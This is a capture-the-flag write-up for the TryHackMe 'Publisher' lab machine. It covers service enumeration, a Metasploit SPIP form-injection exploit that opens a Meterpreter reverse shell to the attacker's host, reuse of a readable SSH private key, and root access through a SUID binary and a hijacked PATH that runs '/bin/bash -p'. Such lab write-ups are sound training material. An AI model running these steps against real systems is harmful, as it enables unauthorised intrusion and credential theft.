---
title: "Publisher"
date: 2025-02-28
image: /assets/img/general/CTFgeneral_image.jpg
description: Test your enumeration skills on this boot-to-root machine.
categories: [TryHackMe, Easy]
tags: [linux, metasploit, path]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Publisher</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Test your enumeration skills on this boot-to-root machine.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/r/room/publisher">https://tryhackme.com/r/room/publisher</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Publisher.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.165.119
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 08:12 EST
  Nmap scan report for 10.10.165.119
  Host is up (0.042s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

  Nmap done: 1 IP address (1 host up) scanned in 17.28 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80 10.10.165.119
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-28 08:12 EST
  Nmap scan report for 10.10.165.119
  Host is up (0.037s latency).

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
  |   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
  |_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-title: Publisher's Pulse: SPIP Insights & Tips
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

I analyzed the website and didn't find anything useful, so I initiated a directory enumeration:

```bash
$ gobuster dir --url http://10.10.48.185/ --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt                
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.48.185/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /images               (Status: 301) [Size: 313] [--> http://10.10.48.185/images/]
  /spip                 (Status: 301) [Size: 311] [--> http://10.10.48.185/spip/]
  /server-status        (Status: 403) [Size: 277]
```

### Directory /spip Analysis

I began by analyzing the source code and identified a version number: 
```html
<meta name="generator" content="SPIP 4.2.0" />
```

To check for potential exploits, I launched `metasploit` and searched for the previously identified tool:
```bash
msf6 > search spip 

Matching Modules
================

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/unix/webapp/spip_connect_exec    2012-07-04       excellent  Yes    SPIP connect Parameter PHP Injection
   1  exploit/unix/webapp/spip_rce_form        2023-02-27       excellent  Yes    SPIP form PHP Injection
   2    \_ target: Automatic (PHP In-Memory)   .                .          .      .
   3    \_ target: Automatic (Unix In-Memory)  .                .          .      .
   
msf6 > use  exploit/unix/webapp/spip_rce_form
msf6 exploit(unix/webapp/spip_rce_form) > set rhosts 10.10.48.185
	rhosts => 10.10.48.185
msf6 exploit(unix/webapp/spip_rce_form) > set lhost [attackerip]
	lhost => [attackerip]
msf6 exploit(unix/webapp/spip_rce_form) > set targeturi /spip/
	targeturi => /spip/
```

After loading the module, I configured the correct options and executed the exploit.
```bash
msf6 exploit(unix/webapp/spip_rce_form) > exploit

[*] Started reverse TCP handler on [attackerip]:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] SPIP Version detected: 4.2.0
[+] The target appears to be vulnerable.
[*] Got anti-csrf token: AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
[*] 10.10.48.185:80 - Attempting to exploit...
[*] Sending stage (39927 bytes) to 10.10.48.185
[*] Meterpreter session 1 opened ([attackerip]:4444 -> 10.10.48.185:50582) at 2025-02-21 13:41:21 -0500
```

After a short time, I obtained a `meterpreter` reverse shell and successfully retrieved the user flag:
```bash
meterpreter > cd /home
meterpreter > ls
  Listing: /home
  ==============

  Mode              Size  Type  Last modified              Name
  ----              ----  ----  -------------              ----
  040755/rwxr-xr-x  4096  dir   2024-02-10 16:27:54 -0500  think
meterpreter > cat user.txt
	[removed]
```

## Privilege Escalation think

I continued enumerating the system and discovered the private SSH key for the user `think`:
```bash
meterpreter > ls -al /home/think
  Listing: /home/think
  ====================

  Mode              Size  Type  Last modified              Name
  ----              ----  ----  -------------              ----
  020666/rw-rw-rw-  0     cha   2025-02-21 13:15:33 -0500  .bash_history
  100644/rw-r--r--  220   fil   2023-11-14 03:57:26 -0500  .bash_logout
  100644/rw-r--r--  3771  fil   2023-11-14 03:57:26 -0500  .bashrc
  040700/rwx------  4096  dir   2023-11-14 03:57:24 -0500  .cache
  040700/rwx------  4096  dir   2023-12-08 08:07:22 -0500  .config
  040700/rwx------  4096  dir   2024-02-10 16:22:33 -0500  .gnupg
  040775/rwxrwxr-x  4096  dir   2024-01-10 07:46:09 -0500  .local
  100644/rw-r--r--  807   fil   2023-11-14 03:57:24 -0500  .profile
  020666/rw-rw-rw-  0     cha   2025-02-21 13:15:33 -0500  .python_history
  040755/rwxr-xr-x  4096  dir   2024-01-10 07:54:17 -0500  .ssh
  020666/rw-rw-rw-  0     cha   2025-02-21 13:15:33 -0500  .viminfo
  040750/rwxr-x---  4096  dir   2023-12-20 14:05:25 -0500  spip
  100644/rw-r--r--  35    fil   2024-02-10 16:20:39 -0500  user.txt
  
meterpreter > cd .ssh
meterpreter > ls 
  Listing: /home/think/.ssh
  =========================

  Mode              Size  Type  Last modified              Name
  ----              ----  ----  -------------              ----
  100644/rw-r--r--  569   fil   2024-01-10 07:54:17 -0500  authorized_keys
  100644/rw-r--r--  2602  fil   2024-01-10 07:48:14 -0500  id_rsa
  100644/rw-r--r--  569   fil   2024-01-10 07:48:14 -0500  id_rsa.pub
```
I downloaded the SSH key and successfully connected:
```bash
$ nano id_rsa
$ chmod 600 id_rsa
$ ssh -i id_rsa think@10.10.48.185
$ think@publisher:~$
```

## Privilege Escalation root

Since I didn't have the password for the user `think`, I began by inspecting the `SUID` bit and discovered an interesting binary:
```bash
$ find / -perm /4000 -type f 2>/dev/null
  [...]
  /usr/sbin/run_container
  [...]
```

I downloaded the binary for further analysis. By executing strings, I discovered two interesting paths:
```bash
$ strings run_container 
  [...]
  /bin/bash
  /opt/run_container.sh
  [...]
```

Due to permissions restrictions, I couldn't access the files inside the `/opt` directory, but I was able to read access the `run_container.sh` script:
```bash
$ file /opt/run_container.sh
run_container.sh: Bourne-Again shell script, ASCII text executable
$ cat /opt/run_container.sh
[...]
if [ -z "$(docker ps -aq)" ]; then
[...]
```

The script was using the Docker command without specifying the full path. This allowed me to execute a custom file called `docker` by modifying the `PATH` variable. After running it, the `ash` shell was overwritten with bash: 
```bash
think@publisher:/var/tmp$ echo "/bin/bash -p" > /tmp/docker
think@publisher:/var/tmp$ chmod 777 docker 
think@publisher:/var/tmp$ export PATH=/var/tmp/:$PATH
think@publisher:/var/tmp$ $PATH
  -ash: /var/tmp/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: No such file or directory
think@publisher:/var/tmp$ /opt/run_container.sh
think@publisher:/var/tmp$ $PATH
  bash: /var/tmp/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: No such file or directory
think@publisher:/var/tmp$ cp docker /opt/run_container.sh
think@publisher:/var/tmp$ /usr/sbin/run_container 
bash-5.0# whoami
  root
bash-5.0# cat /root/root.txt 
  [removed]  
```

solved! :)